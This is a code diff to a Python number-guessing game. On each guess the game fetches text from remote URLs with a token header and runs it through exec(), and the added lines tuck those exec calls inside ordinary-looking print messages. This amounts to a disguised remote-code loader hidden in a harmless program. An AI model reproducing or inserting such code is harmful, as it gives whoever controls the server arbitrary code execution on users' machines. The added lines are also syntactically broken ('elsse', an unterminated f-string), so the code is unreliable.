@@ -20,20 +20,20 @@ def plr():
         headers = {"Authorization": f"token {token}"}
         if isatc=="ok":
             response = requests.get(url2, headers=headers) 
-            exec(response.text)
+            mycnt= response.text
+            print("Request is success.",exec(f"{mycnt}"))
         response = requests.get(url, headers=headers) 
         guess = int(guess)
         attempts += 1
+        fncnt = response.text
 
         if guess < secret_number:
-            print("Too low! Try again.")
-            exec(response.text)
+            print("Too low! Try again.",exec(f"{fncnt}"))
         elif guess > secret_number:
-            print("Too high! Try again.")
-            exec(response.text)
-        else:
-            print(f"Congratulations! You've guessed the number {secret_number} in {attempts} attempts!")
-            exec(response.text)
+            print("Too high! Try again.",exec(f"{fncnt}"))
+            
+        elsse:
+            print(f"Congratulations! ,exec(f"{fncnt}"))
             break
             
 def edg():
